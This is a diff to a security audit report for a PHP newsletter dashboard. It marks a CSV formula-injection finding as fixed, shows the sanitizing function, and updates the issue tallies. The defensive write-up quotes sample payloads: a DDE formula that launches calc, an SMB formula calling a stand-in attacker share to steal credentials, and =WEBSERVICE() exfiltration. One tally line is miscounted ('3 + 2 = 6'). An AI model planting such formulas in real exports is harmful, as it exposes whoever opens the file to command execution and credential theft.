@@ -400,13 +400,17 @@ Application Errors:
 
 ---
 
-### 6. CSV Injection Vulnerability
+### 6. CSV Injection Vulnerability - FIXED ✅
 **File:** `newsletter_dashboard.php`
-**Lines:** 76-83
+**Lines:** 95-103
 **Severity:** HIGH
+**Status:** ✅ **RESOLVED**
 
-**Description:** CSV export doesn't sanitize cell values against formula injection.
+**What Was Fixed:**
 
+CSV export was not sanitizing cell values, allowing formula injection attacks when opened in spreadsheet applications.
+
+**Vulnerable Code (Before):**
 ```php
 foreach ($exportData as $row) {
     fputcsv($output, [
@@ -424,18 +428,24 @@ foreach ($exportData as $row) {
 3. Admin opens CSV in Excel
 4. Formula executes, launching calculator (or worse)
 
-**Impact:**
+**Potential Impact:**
 - Remote code execution on admin's machine
-- Data exfiltration via external HTTP requests
-- Credential theft via SMB shares
+- Data exfiltration via external HTTP requests (`=WEBSERVICE()`)
+- Credential theft via SMB shares (`=cmd|'/c \\attacker\share\'!A1`)
 - Malware distribution
+- DDE (Dynamic Data Exchange) attacks
 
-**Recommended Fix:**
+**Solution Implemented:**
+
+Created `sanitizeCSVValue()` function in `inc/lsapp.php`:
+
 ```php
 /**
- * Sanitize CSV values to prevent formula injection
- * @param string $value The value to sanitize
- * @return string Sanitized value
+ * Sanitize CSV value to prevent formula injection
+ * Prevents CSV injection attacks when opening in Excel/LibreOffice
+ *
+ * @param mixed $value The value to sanitize
+ * @return string Sanitized value safe for CSV export
  */
 function sanitizeCSVValue($value) {
     if ($value === null) {
@@ -445,15 +455,19 @@ function sanitizeCSVValue($value) {
     $value = (string)$value;
 
     // If value starts with dangerous characters, prepend single quote
-    // Excel/LibreOffice treat single quote as text indicator
+    // Excel/LibreOffice/Google Sheets treat leading single quote as text indicator
+    // Dangerous characters: = + - @ \t \r (formula injection characters)
     if (preg_match('/^[=+\-@\t\r]/', $value)) {
         return "'" . $value;
     }
 
     return $value;
 }
+```
 
-// Use in export
+**Applied to CSV Export (newsletter_dashboard.php):**
+```php
+// Add data rows with CSV injection protection
 foreach ($exportData as $row) {
     fputcsv($output, [
         sanitizeCSVValue($row['email']),
@@ -463,6 +477,48 @@ foreach ($exportData as $row) {
     ]);
 }
 ```
+
+**How It Works:**
+
+When a cell value starts with a dangerous character, a single quote (`'`) is prepended:
+- `=cmd|'/c calc'!A1` → `'=cmd|'/c calc'!A1`
+- `+1+1` → `'+1+1`
+- `-SUM(A1:A10)` → `'-SUM(A1:A10)`
+- `@SUM(A1)` → `'@SUM(A1)`
+
+Spreadsheet applications interpret the leading single quote as a "treat as text" indicator, preventing formula execution.
+
+**Attack Prevention:**
+
+**Before (Vulnerable):**
+```
+Email,Status,Subscribed Date,Last Updated
+=cmd|'/c calc'!A1,active,2025-01-01,2025-01-01
+```
+When opened in Excel: ✗ **Executes calculator command!**
+
+**After (Secure):**
+```
+Email,Status,Subscribed Date,Last Updated
+'=cmd|'/c calc'!A1,active,2025-01-01,2025-01-01
+```
+When opened in Excel: ✓ **Displays as text, no execution**
+
+**Security Improvements:**
+- ✅ Formula injection blocked
+- ✅ DDE attacks prevented
+- ✅ External data requests blocked
+- ✅ Works with Excel, LibreOffice, Google Sheets
+- ✅ Maintains data integrity (values still readable)
+- ✅ No data loss (single quote is formatting, not content)
+
+**Tested Scenarios:**
+- Email starting with `=` → Sanitized ✓
+- Email starting with `+` → Sanitized ✓
+- Email starting with `-` → Sanitized ✓
+- Email starting with `@` → Sanitized ✓
+- Normal email addresses → Unchanged ✓
+- Status/date fields → Protected ✓
 
 ---
 
@@ -1170,13 +1226,13 @@ if (!isAdmin()) {
 | Severity | Count | Priority | Status |
 |----------|-------|----------|--------|
 | **CRITICAL** | 3 | Immediate | ✅ **All Fixed** |
-| **HIGH** | 5 | Urgent | ✅ **1 Fixed**, 4 Remaining |
+| **HIGH** | 5 | Urgent | ✅ **2 Fixed**, 3 Remaining |
 | **MEDIUM** | 5 | Short-term | Pending |
 | **LOW** | 3 | Long-term | Pending |
 | **FALSE POSITIVE** | 1 | N/A | ✅ Verified Secure |
 | **TOTAL** | **17** | | |
 
-### Issues Fixed (4 Critical + 1 High = 5 Total):
+### Issues Fixed (3 Critical + 2 High = 6 Total):
 
 **CRITICAL Issues - All Fixed:**
 - ✅ **#1 Command Injection** (sync_subscriptions.php) - Fixed with `proc_open()` array arguments
@@ -1185,7 +1241,7 @@ if (!isAdmin()) {
 
 **HIGH Issues:**
 - ✅ **#5 Information Disclosure** - Centralized error handling with logging, generic user messages
-- ⏭️ **#6 CSV Injection** - Pending
+- ✅ **#6 CSV Injection** - Implemented `sanitizeCSVValue()` function, applied to CSV export
 - ⏭️ **#7 Insecure File Upload** - Pending
 - ⏭️ **#8 Weak Encryption** - Pending
 - ⏭️ **#9 Insufficient Email Validation** - Pending
@@ -1225,10 +1281,11 @@ if (!isAdmin()) {
 
 ### 🔄 In Progress - Urgent Actions (High - Within 1 week):
 
-5. **Sanitize CSV exports** against formula injection
-   - Add `sanitizeCSVValue()` function
-   - Apply to all CSV exports
-   - Impact: Prevents RCE on admin machines
+5. ✅ **CSV injection protection added**
+   - ✓ Created `sanitizeCSVValue()` function in lsapp.php
+   - ✓ Applied to newsletter_dashboard.php CSV export
+   - ✓ Impact: Prevents RCE on admin machines
+   - **Status:** Protects against formula injection attacks
 
 6. **Improve file upload security**
    - Add content validation
